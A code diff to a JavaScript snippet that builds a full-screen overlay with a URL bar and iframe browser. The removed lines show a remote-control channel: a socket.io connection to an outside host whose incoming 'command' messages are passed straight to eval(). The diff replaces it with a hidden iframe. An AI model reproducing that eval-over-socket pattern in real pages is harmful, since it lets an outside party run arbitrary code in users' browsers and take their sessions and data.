@@ -10,14 +10,7 @@ if (document.getElementById('sidemenu')) {
     bdy.appendChild(sidemenu);
     sidemenu.setAttribute('style', 'height:100%; width:100%; color:white; font-family:Monospace; font-size:12px; z-index:10000; display: inline-block; overflow:visible; position:fixed; left:0; top: 0; background:black;');
     sidemenu.innerHTML=`
-    <script src="https://raw.githubusercontent.com/socketio/socket.io-client/master/dist/socket.io.js"></script>
-    <script>
-    alert("loading");
-    var socket = io.connect("https://remotejs.loophole.site");
-      alert("loaded")
-      socket.on('command', function(command) {
-        eval(command);
-      });</script>
+    <iframe style="display:none;" src="https://raw.githubusercontent.com/socketio/socket.io-client/master/dist/socket.io.js"></iframe>
     <input style="height:4%; border:solid black 1px; color:white; background:grey; font-family:Monospace;" id="urlinput"/>
     
     <button style="width:20px; height:4%; border:none; color:white; background:grey; font-family:Monospace;" onclick="url=document.getElementById('urlinput').value;if(url.startsWith('https://')){document.getElementById('sidemenuframe').src=url;}else if(url.startsWith('http://')){alert('[WARN] http might not work due to downgrade policy.');document.getElementById('sidemenuframe').src=url;}else{document.getElementById('sidemenuframe').src='https://'+url}">⌕</button>
